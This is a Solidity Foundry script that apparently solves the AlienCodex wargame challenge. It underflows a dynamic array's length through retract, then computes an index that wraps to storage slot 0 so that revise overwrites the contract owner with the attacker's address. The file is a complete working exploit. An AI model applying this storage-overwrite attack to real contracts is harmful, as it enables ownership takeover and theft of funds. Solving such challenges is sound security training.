// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IAlienCodex} from "../src/AlienCodexInterface.sol";

contract AlienCodexAttack is Script {
    function run() external {
        address attacker = vm.addr(vm.envUint("PRIVATE_KEY"));

        IAlienCodex target = IAlienCodex(0xf3226c377f4192CC0599055eae0A2dd9bC659E26);

        // IMPORTANT: Verify the actual storage layout first.
        uint256 arraySlot = 1;
        uint256 ownerSlot = 0;

        uint256 base = uint256(
            keccak256(abi.encode(arraySlot))
        );

        uint256 index;
        unchecked {
            index = ownerSlot - base;
        }

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        target.makeContact();
        target.retract();

        target.revise(
            index,
            bytes32(uint256(uint160(attacker)))
        );

        vm.stopBroadcast();

        console2.log("Owner after attack:", target.owner());
        console2.log("Attacker:", attacker);
    }
}